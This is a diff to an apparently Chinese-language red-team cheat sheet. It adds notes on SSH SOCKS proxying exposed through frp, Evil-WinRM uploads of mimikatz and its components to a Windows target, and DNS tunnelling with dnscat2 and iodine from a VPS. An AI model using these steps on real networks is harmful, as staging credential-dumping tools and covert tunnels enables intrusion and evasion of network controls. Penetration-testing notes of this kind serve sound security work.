@@ -557,6 +557,22 @@ proxy tcp -p ":23080" -T tcp -P "22.22.22.33:33080"
 
 ![640 _1_.png](https://s2.loli.net/2023/04/10/cwQmkx8PrqvgT9b.png)
 
+```sh
+# vps的localhost监听29999端口  SOCKS 协议代理
+## 还需要利用frp把vps的29999端口映射到外部的39999端口，配置文件如下：
+vps$ ssh -N -D 29999 root@192.168.0.2
+
+[common]
+server_addr = 1.1.1.1
+server_port = 7000
+
+[yj]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 29999
+remote_port = 39999
+```
+
 - 本地转发: 将 Ubuntu:22 转到 kali:222
 
 ```sh
@@ -669,8 +685,9 @@ ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
 | -D   | SOCKS 代理的端口               |
 
 ### 端口转发/服务器的 80，转发到客户端本地的 80
-* 需要root权限
-* 访问ubuntu的80端口会被转发到ubuntu的79端口，ubuntu的79端口会转发到我们本机的80端口
+
+- 需要 root 权限
+- 访问 ubuntu 的 80 端口会被转发到 ubuntu 的 79 端口，ubuntu 的 79 端口会转发到我们本机的 80 端口
 
 注意：由于 SSH 的反向端口转发监听的时候只会监听 127.0.0.1，所以这时候需要点技巧
 如图所示，即使反向端口转发 79 端口指定监听全部 `(-R \*:79:127.0.0.1:80)`，端口 79 依旧绑定在了 127.0.0.1（图中顺便把 socks5 代理也开了）
@@ -680,7 +697,7 @@ kali@129$ ssh -i id_rsa root@47.92.254.136 -D 0.0.0.0:1080 -R \*:79:127.0.0.1:80
 # socat，让 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的 80 ,变相使 80 监听在 0.0.0.0
 root@47.92.254.136$ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
 kali@129$ nc -lvvp 80
-# 向 47.92.254.136 的80端口tcp发消息在kali上就能接收到   
+# 向 47.92.254.136 的80端口tcp发消息在kali上就能接收到
 ```
 
 ## socat 端口转发
@@ -956,6 +973,12 @@ winrs -r:http://192.168.2.153:5985 -u:desktop-r3kfb05\hacker -p:qwe123.. "ipconf
 ## 打开CMD交互
 winrs -r:http://192.168.1.20 -u:用户名 -p:密码 cmd
 
+## 上传文件
+*Evil-WinRM* PS$ upload /tmp/m/mimidrv.sys .
+*Evil-WinRM* PS$ upload /tmp/m/mimilib.dll .
+*Evil-WinRM* PS$ upload /tmp/m/mimispool.dll .
+*Evil-WinRM* PS$ upload /tmp/m/mimikatz.exe .
+
 ```
 
 # other
@@ -1129,6 +1152,52 @@ bloodhound --nosandbox
 
 - neo4j.bat 找不到或无法加载主类 org.neo4j.server.startup.Neo4jCommand
 - neo4jHOME 有问题，可以删除掉 或者设置为 当前路径
+
+### dns 隧道
+
+参考 TunnelX
+
+1. 配置一个 VPS 的域名。
+
+```sh
+# 1. 添加A记录  test.example.com 指向 VPS
+# 2. 添加NS记录 ns1.example.com  指向 test.example.com
+
+# 3. 关闭VPS的53端口
+systemctl stop systemd-resolved
+docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb ns1.example.com -c datou
+```
+
+2. 在内网机器上运行 iodine 连接 VPS 组网
+
+```sh
+# dnscat和iodine都依赖53端口，照理来说应该要两台vps，那么我们如何在一台vps、一个域名的情况下完成代理呢？ A:让程序挂后台sleep一会。
+chmod +x /tmp/iodine
+nohup sleep 10 && /tmp/iodine -f -P datou ns1.example.com &
+## 然后立即关闭 docker dns进程。启动 iodined
+
+# 防火墙开放
+vps$ firewall-cmd --add-port=53/udp  --permanent
+vps$ firewall-cmd --reload
+vps$ iodined -f -c -P datou 192.168.0.1 ns1.example.com -DD
+
+## vps的localhost监听29999端口
+vps$ ssh -N -D 29999 root@192.168.0.2
+```
+
+- 还需要利用 frp 把 vps 的 29999 端口映射到外部的 39999 端口，配置文件如下：
+
+```sh
+[common]
+server_addr = 1.1.1.1
+server_port = 7000
+
+[yj]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 29999
+remote_port = 39999
+```
 
 # 团队协作
 
